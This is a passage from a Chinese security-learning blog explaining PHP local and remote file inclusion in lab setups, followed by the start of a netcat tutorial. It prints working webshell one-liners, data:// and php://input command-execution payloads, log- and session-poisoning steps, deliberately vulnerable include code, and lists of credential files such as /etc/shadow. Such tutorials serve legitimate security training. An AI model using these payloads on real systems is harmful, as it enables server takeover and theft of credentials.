<h5 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h5><ul>
<li>require()</li>
<li>require_once()</li>
<li>include()</li>
<li>include_once()</li>
</ul>
<p><strong><code>include</code>和<code>require</code>区别</strong>:<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
<p><img src="9272355-7889a572371b18c8.png" alt=""></p>
<h5 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h5><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致执行了非预期的代码。</p>
<p>示例代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
       <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p>
<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>文件包含分为：本地(LFI)/远程(RFI)包含</p>
<p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p>
<p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br> 但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
<pre class=" language-undefined"><code class="language-undefined">allow_url_fopen = On
allow_url_include = On，重启apache，即可生效</code></pre>
<p>两个配置选项均需要为On，才能远程包含文件成功。<br> 另外一台需要开启apache</p>
<pre class=" language-kotlin"><code class="language-kotlin">apt<span class="token operator">-</span><span class="token keyword">get</span> install apache2
 <span class="token operator">/</span>etc<span class="token operator">/</span><span class="token keyword">init</span><span class="token punctuation">.</span>d<span class="token operator">/</span>apache2 start</code></pre>
<p><img src="9272355-952116d80dc7f768%5B1%5D.png" alt=""></p>
<p><img src="9272355-e288840e08e52b5e%5B1%5D.png" alt=""></p>
<p> 注：在php.ini中，allow_url_fopen默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off。<br> 下面例子中测试代码均为：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>allow_url_fopen 默认为 On<br> allow_url_include 默认为 Off<br> 若有特殊要求，会在利用条件里指出。</p>
<h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><h5 id="一、无限制本地文件包含漏洞"><a href="#一、无限制本地文件包含漏洞" class="headerlink" title="一、无限制本地文件包含漏洞"></a>一、无限制本地文件包含漏洞</h5><p><strong>测试代码：</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><strong>常见的敏感信息目录：</strong></p>
<p>window系统：</p>
<ul>
<li>c:\boot.ini //查看系统版本</li>
<li>c:\windows\system32\inetsrv\MetaBase.xml //IIS配置</li>
<li>c:\windows\repair\sam  // 存储Windows系统初次安装的密码</li>
<li>c:\ProgramFiles\mysql\my.ini // MySQL配置</li>
<li>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</li>
<li>c:\windows\php.ini // php 配置信息</li>
</ul>
<p>Linux系统</p>
<ul>
<li>/etc/passwd // 账户信息</li>
<li>/etc/shadow // 账户密码文件</li>
<li>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</li>
<li>/etc/my.conf // mysql 配置文件</li>
</ul>
<h5 id="二、session文件包含漏洞"><a href="#二、session文件包含漏洞" class="headerlink" title="二、session文件包含漏洞"></a>二、session文件包含漏洞</h5><p><strong>利用条件</strong></p>
<p>1.我们可以通过phpinfo的信息泄露获取到session的存储位置</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200123104312.png" alt=""></p>
<p>2.或者通过猜测默认的session存放位置</p>
<p>linux下的默认存储目录为/var/lib/php/session</p>
<p><strong>利用过程</strong></p>
<p>我们可以先使用文件包含上传恶意代码，比如</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$ctfs</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctfs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$ctfs</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span></code></pre>
<p>此php会将获取到的GET型ctfs变量的值存入到session中。如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码。<br>我们构造：</p>
<img src="QQ截图20200123104221.png" style="zoom:80%;" />

<p>我们发现在本地session所在目录下存储了session的值</p>
<img src="QQ截图20200123105708.png" style="zoom:80%;" />

<p>攻击者通过phpinfo()信息泄露或者猜测获取到session存放的目录位置，然后通过浏览器自带开发者模式获取到文件名称：sess_lotipf7ccidsbsrltdau35rb65</p>
<img src="QQ截图20200123103711.png" style="zoom:150%;" />

<p>构造本地文件包含 ：<strong>file.php?D:\phpStudy\PHPTutorial\tmp\tmp\sess_lotipf7ccidsbsrltdau35rb65</strong></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200123104500.png" alt=""></p>
<h5 id="三、有限制本地文件包含漏洞绕过"><a href="#三、有限制本地文件包含漏洞绕过" class="headerlink" title="三、有限制本地文件包含漏洞绕过"></a>三、有限制本地文件包含漏洞绕过</h5><p><strong>%00截断</strong></p>
<p>条件：magic_quotes_gpc=Off  并且php版本&lt;5.3.4</p>
<p><strong>测试代码</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token punctuation">.</span> <span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>当我们直接包含本地的test.txt时</p>
<img src="QQ截图20200123113838.png" style="zoom:67%;" />

<p>我们在test.txt加上%00进行截断</p>
<img src="QQ截图20200123113851.png" style="zoom:67%;" />







<p><strong>四、路径长度限制</strong></p>
<p>条件：windows OS,点号需要长于256；linuxOS 长于4096</p>
<pre><code>windows下目录最大长度为256字节，超出的部分会被丢弃；
linux下目录最大长度为4096字节，超出的部分会被丢弃。</code></pre><p>测试代码：</p>
<pre><code>&lt;?php
   $filename =$_GET[&#39;filename&#39;];
   include($filename . &quot;.html&quot;);
   ?&gt;</code></pre><h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
<pre><code>allow_url_fopen = On（是否允许打开远程文件）
allow_url_include = On（是否允许include/require远程文件）</code></pre><p>示例：</p>
<p>测试代码：</p>
<pre><code>&lt;?php
    $filename  = $_GET[&#39;filename&#39;];
    include($filename);
?&gt;</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200203191630.png" alt=""></p>
<h4 id="PHP伪协议在文件包含中的应用"><a href="#PHP伪协议在文件包含中的应用" class="headerlink" title="PHP伪协议在文件包含中的应用"></a>PHP伪协议在文件包含中的应用</h4><p>PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数。除了这些封装协议、还能通过stream_wrapper_register() 来注册自定义的封装协议。</p>
<p><strong>php伪协议类别</strong></p>
<ul>
<li>file://    访问本地文件系统</li>
<li>http://   访问HTTP（s)网址</li>
<li>ftp://     访问FTP(s) URLs</li>
<li>php://      访问各个输入/输出流</li>
<li>zlib://     压缩流</li>
<li>data://  数据</li>
</ul>
<p><strong>php://filter(本地磁盘文件进行读取）</strong></p>
<p>元封装器，设计用于“数据流打开“时的”筛选过滤“应用，对本地磁盘文件进行读写。</p>
<p>用法：?filename=php://filter/convert.base64-encode/resource=xxx.php</p>
<p>条件：需要开启allow_url_fopen</p>
<p>示例：</p>
<p>本地新建file.php</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128205700.png" alt=""></p>
<p>我们使用php伪协议在本地读取shell.php文件中的内容</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128205953.png" alt=""></p>
<p>对得到的Base64进行解码即可。</p>
<p><strong>file://伪协议（读取文件内容）</strong></p>
<p>通过file协议可以访问本地文件系统，读取到文件的内容</p>
<p>示例：</p>
<img src="QQ截图20200203184038.png" style="zoom:67%;" />



<h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
<p>用法：?file=php://input 数据利用POST传过去。</p>
<p>利用条件：</p>
<p>allow_url_include = On。<br> 对allow_url_fopen不做要求</p>
<pre><code>&lt;?phpinfo();?&gt;
&lt;?php system(&#39;whoami&#39;);?&gt;
&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\$_POST[&#39;caidao&#39;];?&gt;)&quot;)?&gt;</code></pre><p>包含姿势：</p>
<pre><code>index.php
?file=php://input

POST:
&lt;? phpinfo();?&gt;</code></pre><h5 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h5><p>​      碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
<p>测试代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input");</span>
<span class="token delimiter">?></span></code></pre>
<img src="QQ截图20200203182852.png" style="zoom:67%;" />

<h5 id="php-input-命令执行"><a href="#php-input-命令执行" class="headerlink" title="php://input(命令执行)"></a>php://input(命令执行)</h5><p>测试代码：</p>
<pre><code>&lt;?php
    $filename  = $_GET[&#39;filename&#39;];
    include($filename);
?&gt;</code></pre><p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200203183726.png" alt=""></p>
<h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h5><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。</p>
<p>利用条件：</p>
<p>php版本大于等于php5.2<br> allow_url_fopen = On<br> allow_url_include = On</p>
<p>示例1：</p>
<pre><code>/index2.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></pre><p><img src="9272355-5449b681b9c47ddb%5B1%5D.png" alt=""></p>
<p>执行命令：</p>
<pre><code>index2.php?file=data:text/plain;&lt;?php system(&quot;whoami&quot;);?&gt;</code></pre><p><img src="9272355-0fce621191e72481%5B1%5D.png" alt=""></p>
<p>示例2：</p>
<pre><code>/index2.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<?php phpinfo() ?></p>
<p><strong>包含session</strong></p>
<p>利用条件：session文件路径已知，且其中内容部分可控。</p>
<p>思路：结合phpmyadmin,因为phpmyadmin每次登录时，会带上session。</p>
<p><img src="9272355-dd5195fec4210a53.png" alt=""></p>
<p>session文件的绝对路径可在phpinfo中查看，session.save_path</p>
<p><img src="9272355-1e7dd8fd1a028711%5B1%5D.png" alt=""></p>
<p>常见的php-session存放位置还有这几个：</p>
<pre class=" language-csharp"><code class="language-csharp"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID
<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID</code></pre>
<p>使用以下命令可查看到session文件中的登录信息</p>
<pre class=" language-csharp"><code class="language-csharp">strings <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php5<span class="token operator">/</span>sess_258c1be1b00d080bddc58d2896460542facb6f1f <span class="token operator">|</span> grep root</code></pre>
<p><img src="9272355-940bb1d740bd0d47%5B1%5D.png" alt=""></p>
<p>登录phpmyadmin时，用户名输入一句话木马，再包含session文件，可getshell</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
<p><img src="9272355-c833b1fd110b6170%5B1%5D.png" alt=""></p>
<p><img src="9272355-5304d206d0b1fcc8%5B1%5D.png" alt=""></p>
<p>使用菜刀连接<br> <a href="http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c" target="_blank" rel="noopener">http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c</a><br> 在浏览器里有你的cookie所以你可以直接去访问对应的文件包含页面，用菜刀的话是没有cookie的所以你没有办法去访问文件包含页面也就是fi那个页面。所以说会自动跳转到登录页面，显示200ok</p>
<p>加上cookie之后在重新连接，成功连接</p>
<p><img src="9272355-44a9d0f1054d26b9%5B1%5D.png" alt=""></p>
<h5 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h5><ul>
<li><p>利用条件：php版本大于等于php5.3.0</p>
</li>
<li><p>这个参数就是php解压缩包的一个函数，不管后缀是什么，都会被当做压缩包来解压。</p>
<p>用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php </p>
<p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </p>
</li>
<li><p>姿势：假设有个文件phpinfo.txt，其内容为<?php phpinfo(); ?>，打包成zip压缩包，如下：</p>
</li>
</ul>
<p><img src="9272355-041eece378dca1e4.png" alt=""></p>
<p>指定绝对路径：</p>
<pre><code>index2.php?file=phar://C:\phpStudy\WWW\FileInclusion\phpinfo.zip\phpinfo.txt</code></pre><p>或者利用相对路径（这里phpinfo.zip就在当前目录下）</p>
<pre><code>index2.php?file=phar://phpinfo.zip/phpinfo.txt</code></pre><p><img src="9272355-489da319d283d845.png" alt=""></p>
<h5 id="zip：-伪协议"><a href="#zip：-伪协议" class="headerlink" title="zip：//伪协议"></a>zip：//伪协议</h5><ul>
<li><p>php版本大于等于php5.3.0</p>
</li>
<li><p>zip伪协议和phar协议类似，但是用法不一样。</p>
</li>
<li><p>用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</p>
</li>
<li><p>条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
</li>
</ul>
<pre><code>index2.php?file=zip://C:\phpStudy\WWW\FileInclusion\phpinfo.zip%23phpinfo.txt</code></pre><h4 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h4><p>如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传<br>上传一个图片木马a.jpg，内容为：</p>
<pre><code>&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[tzc]);?&gt;&quot;)?&gt;</code></pre><h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。<br>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。<br>利用的条件：</p>
<ul>
<li>1.日志的物理存放路径</li>
<li>2.存在文件包含漏洞</li>
</ul>
<p>获取日志存放路径</p>
<p>（一）日志默认路径</p>
<p>(1) apache+Linux日志默认路径</p>
<pre class=" language-undefined"><code class="language-undefined">    /etc/httpd/logs/access_log</code></pre>
<p>或者</p>
<pre class=" language-bash"><code class="language-bash">    /var/log/httpd/access_log</code></pre>
<p>(2) apache+win2003日志默认路径</p>
<pre class=" language-cpp"><code class="language-cpp">    D<span class="token operator">:</span>\xampp\apache\logs\access<span class="token punctuation">.</span>log
    D<span class="token operator">:</span>\xampp\apache\logs\error<span class="token punctuation">.</span>log</code></pre>
<p>(3) IIS6.0+win2003默认日志文件</p>
<pre class=" language-undefined"><code class="language-undefined">    C:\WINDOWS\system32\Logfiles</code></pre>
<p>(4) IIS7.0+win2003 默认日志文件</p>
<pre class=" language-undefined"><code class="language-undefined">    %SystemDrive%\inetpub\logs\LogFiles</code></pre>
<p>(5) nginx 日志文件</p>
<pre class=" language-bash"><code class="language-bash">    日志文件在用户安装目录logs目录下
            以我的安装路径为例/usr/local/nginx,
            那我的日志目录就是在/usr/local/nginx/logs里</code></pre>
<p>首先，我们直接使用浏览器来构造“php一句话报错请求信息”服务自动记录此一句话信息到服务器日志文件中；<br>具体构造内容：</p>
<pre class=" language-xml"><code class="language-xml"> http://127.0.0.1:81/FileInclusion/index2.php?file=<span class="token prolog">&lt;?php @eval($_POST[c]);?></span></code></pre>
<p><img src="9272355-f9f0db6a9d7ff53a%5B1%5D.png" alt=""></p>
<p>（2）测试结果：失败<br>利用文件包含漏洞直接访问“服务日志文件”，发现文件包含漏洞并未对构造的php一句话进行正常解析，观察发现是构造的PHP一句话中的相关字符在记录进日志文件后，相关的字符被转码了，导致PHP解析失败，具体失败原因见“失败原因分析”</p>
<p><img src="9272355-738380f7e8b09e46%5B1%5D.png" alt=""></p>
<p>image.png（3）失败原因分析<br>一句话写入日志文件的利用过程是，利用浏览器直接构造一个关于请求资源的报错信息，消息中包含依据。报错信息服务自动记录到日志文件，但实际测试发现写入日志文件内的报错信息发生了字符转码：<br>日志文件内容如上图所示：</p>
<pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>page<span class="token operator">=</span><span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre>
<pre class=" language-rust"><code class="language-rust">               <span class="token string">"&lt;"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 大于号被转码为了 <span class="token operator">%</span>3C
                <span class="token string">">"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 小于号被转码为了 <span class="token operator">%</span>3E
                <span class="token string">" "</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 空格被转码为了 <span class="token operator">%</span><span class="token number">20</span></code></pre>
<p>最后写入到日志文件中的一句话就变成了 %3C?php%20@eval($_POST[c]);?%3E。</p>
<p>（4） 失败总结<br>浏览器直接构造的PHP一句话中特殊字符，会被浏览器自动进行URL转义，导致最终写入日志文件中的PHP一句话包含了这些特殊字符，而这些转码后的编码PHP并不能进行正常的解析。<br>（5）构造一句话，写入日志文件测试记录<br>burpsuit 代理抓包改包构造一句话写入日志文件<br>（1） burpsuit 代理抓包，修改浏览器转码字符，写入正确的php一句话木马到服务器日志文件。</p>
<p><img src="9272355-ff2a0beae4cc4468%5B1%5D.png" alt=""></p>
<p>（2） 测试记录：成功<br>通过文件包含直接访问服务日志文件，发现一句话被执行成功；</p>
<p><img src="9272355-f5d368a6f62b9802%5B1%5D.png" alt=""></p>
<p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，还可以包含Apache的错误访问日志</p>
<p>首先，构造一个会报错的访问链接，将利用代码（PHP一句话）写入错误日志记录中</p>
<pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre>
<p>这个链接直接访问的话，一句话会被编码成%3C?php%20@eval($_POST[c]);?%3E，所以需要使用Burp suite改一下包。</p>
<p><img src="9272355-e094a1b3f7e98f45%5B1%5D.png" alt=""></p>
<p>对所截获的包进行修改，点击go，返回403报错，服务器错误日志文件成功将此次记录到error.log中<br>我们根据日志的路径构造访问路径:</p>
<pre class=" language-cpp"><code class="language-cpp">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">81</span><span class="token operator">/</span>FileInclusion<span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>C<span class="token operator">:</span><span class="token operator">/</span>phpStudy<span class="token operator">/</span>Apache<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span>log</code></pre>
<p>客户端连接，获取一句话木马</p>
<h5 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h5><p>利用的条件：</p>
<p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
<p>姿势：<br>用ssh连接：<br><a href="https://www.jianshu.com/p/7cbc878d64ae" target="_blank" rel="noopener">参考这个网站</a></p>
<h5 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h5><p><a href="https://vulhub.org/#/environments/php/inclusion/" target="_blank" rel="noopener">参考这个网站</a></p>
<h4 id="jsp文件包含漏洞"><a href="#jsp文件包含漏洞" class="headerlink" title="jsp文件包含漏洞"></a>jsp文件包含漏洞</h4><p>include</p>
<pre><code>&lt;%@ include file=&quot;head.jsp&quot;%&gt;
&lt;%@ include file=&quot;body.jsp&quot;%&gt;
&lt;%@ include file=&quot;tail.jsp&quot;%&gt;</code></pre><p>jsp:include</p>
<pre><code>&lt;jsp:include page=&quot;head.jsp&quot;/&gt;
&lt;jsp:include page=&quot;body.jsp&quot;/&gt;   
&lt;jsp:include page=&quot;tail.jsp”/&gt;</code></pre><p>采用JSTL</p>
<pre><code>&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;</code></pre><h4 id="asp文件包含漏洞"><a href="#asp文件包含漏洞" class="headerlink" title="asp文件包含漏洞"></a>asp文件包含漏洞</h4><p>asp貌似无法包含远程文件（iis安全设置），只能包含本地文件，语法如下：</p>
<pre><code>    &lt;!--#include file=&quot;1.asp&quot; --&gt;</code></pre><h4 id="aspx文件包含漏洞"><a href="#aspx文件包含漏洞" class="headerlink" title="aspx文件包含漏洞"></a>aspx文件包含漏洞</h4><p>aspx文件包含与asp一样，语法如下：</p>
<pre><code>    &lt;!--#include file=&quot;top.aspx&quot; --&gt;</code></pre><hr>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://www.jianshu.com/p/8803aff98bfa" target="_blank" rel="noopener">https://www.jianshu.com/p/8803aff98bfa</a></p>
<p><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p>
<p><a href="https://blog.csdn.net/God_XiangYu/article/details/97335988#asp文件包含漏洞" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/97335988#asp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E</a></p>
<p><a href="https://thief.one/2017/04/10/2/" target="_blank" rel="noopener">https://thief.one/2017/04/10/2/</a></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>文件包含漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试——基本工具</title>
    <url>/2020/03/12/shen-tou-ce-shi-ji-ben-gong-ju/</url>
    <content><![CDATA[<h3 id="渗透测试——基本工具"><a href="#渗透测试——基本工具" class="headerlink" title="渗透测试——基本工具"></a>渗透测试——基本工具</h3><h4 id="一、NETCAT（nc"><a href="#一、NETCAT（nc" class="headerlink" title="一、NETCAT（nc)"></a>一、NETCAT（nc)</h4><ul>
<li>网络工具中的瑞士军刀（小身材、大智慧）</li>
<li>侦听模式/传输模式</li>
<li>telent/获取banner信息</li>
<li>传输文本信息</li>
<li>传输文件/目录</li>
<li>加密传输文件</li>
<li>远程控制/木马</li>
<li>加密所有流量</li>
<li>流媒体服务器</li>
<li>远程克隆硬盘</li>
</ul>
<p><strong>NC（TELNET/BANNER功能）</strong></p>
<ul>
<li>nc -nv 1.1.1.1 110</li>
<li>nc -nv 1.1.1.1 25</li>
<li>nc -nv 1.1.1.1 80</li>
</ul>
<p>nc作为客户端时，可以对服务器端进行侦听</p>
<p><strong>示例：</strong></p>
<p>ping pop3.163.com  #查看163邮箱pop3的IP地址</p>
<p>nc -nv 123.125.50.29 110 #n只跟IP地址，不对DNS地址进行解析；v显示详细输出信息；参数后面跟                                                服务IP和端口</p>
<p>user   邮箱用户名（base64编码）   邮箱密码（base64编码）</p>
<p>通过以上命令可以在命令行下接受邮件。</p>
<h5 id="NC（传输文本信息）"><a href="#NC（传输文本信息）" class="headerlink" title="NC（传输文本信息）"></a><strong>NC（传输文本信息）</strong></h5><p><strong>示例</strong>：</p>
<p>服务器端：nc -l -p 3333  #-l 表示侦听 -p指定打开的端口号</p>
<p>​                   netstat -pantu | grep 3333 #查看3333端口是否打开</p>
<p>客户端： nc -nv 192.168.1.132 3333 #参数后面跟服务器的IP地址和开放的端口。</p>
<h5 id="NC（远程电子取证信息收集"><a href="#NC（远程电子取证信息收集" class="headerlink" title="NC（远程电子取证信息收集)"></a><strong>NC（远程电子取证信息收集)</strong></h5><p><strong>示例1：</strong></p>
<p>A对B当前目录信息进行取证</p>
<p>A：nc -l -p 3333 #-l表示侦听 -p指定打开的端口号 A对3333端口开始侦听</p>
